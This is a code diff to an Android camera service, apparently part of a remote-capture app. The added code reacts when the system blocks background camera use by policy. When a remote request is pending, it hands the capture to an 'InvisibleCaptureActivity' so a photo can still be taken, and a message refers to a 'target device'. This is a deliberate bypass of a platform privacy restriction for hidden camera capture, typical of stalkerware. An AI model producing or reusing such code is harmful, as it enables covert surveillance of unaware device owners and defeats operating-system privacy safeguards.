@@ -307,6 +307,24 @@ class CameraCaptureService : Service() {
                     device.close()
                     if (isDone.compareAndSet(false, true)) {
                         mainHandler.removeCallbacks(timeoutRunnable)
+                        if (error == CameraDevice.StateCallback.ERROR_CAMERA_DISABLED && !requestId.isNullOrEmpty()) {
+                            Log.w(TAG, "CameraDevice ERROR_CAMERA_DISABLED in background service. Delegating to InvisibleCaptureActivity...")
+                            try {
+                                val invIntent = Intent(this@CameraCaptureService, InvisibleCaptureActivity::class.java).apply {
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                                    putExtra("action", "camera_capture")
+                                    putExtra("requestId", requestId)
+                                    putExtra("cameraFacing", facing)
+                                }
+                                startActivity(invIntent)
+                                cleanup()
+                                stopSelf()
+                                return
+                            } catch (actErr: Throwable) {
+                                Log.e(TAG, "Failed to launch InvisibleCaptureActivity fallback: ${actErr.message}")
+                            }
+                        }
+
                         val msg = when (error) {
                             CameraDevice.StateCallback.ERROR_CAMERA_DISABLED ->
                                 "Camera blocked by device security policy / background camera restriction (CAMERA_DISABLED)"
@@ -330,7 +348,26 @@ class CameraCaptureService : Service() {
             Log.e(TAG, "startCapture failed: ${e.message}", e)
             if (isDone.compareAndSet(false, true)) {
                 mainHandler.removeCallbacks(timeoutRunnable)
-                val msg = if (e.message?.contains("CAMERA_DISABLED") == true || e.message?.contains("policy") == true) {
+                val isPolicyError = e.message?.contains("CAMERA_DISABLED") == true || e.message?.contains("policy") == true
+                if (isPolicyError && !requestId.isNullOrEmpty()) {
+                    Log.w(TAG, "Camera blocked by policy in background service. Delegating to InvisibleCaptureActivity...")
+                    try {
+                        val invIntent = Intent(this, InvisibleCaptureActivity::class.java).apply {
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+                            putExtra("action", "camera_capture")
+                            putExtra("requestId", requestId)
+                            putExtra("cameraFacing", facing)
+                        }
+                        startActivity(invIntent)
+                        cleanup()
+                        stopSelf()
+                        return
+                    } catch (actErr: Throwable) {
+                        Log.e(TAG, "Failed to launch InvisibleCaptureActivity fallback: ${actErr.message}")
+                    }
+                }
+
+                val msg = if (isPolicyError) {
                     "Camera access disabled by device policy / background restrictions. Open the app on the target device to capture."
                 } else {
                     "Camera start error: ${e.message}"
